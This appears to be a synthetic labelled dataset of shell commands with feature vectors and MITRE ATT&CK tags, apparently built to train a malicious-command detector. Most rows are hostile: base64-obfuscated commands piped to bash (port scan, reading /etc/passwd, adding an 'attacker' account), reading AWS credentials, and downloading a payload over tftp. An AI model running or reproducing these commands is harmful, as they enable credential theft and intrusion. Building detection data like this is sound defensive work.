nohup echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIicgJiYgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""cat /etc/passwd | awk -F: '$3 >= 1000'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
sudo tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24 && chmod +x /tmp/payload","[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
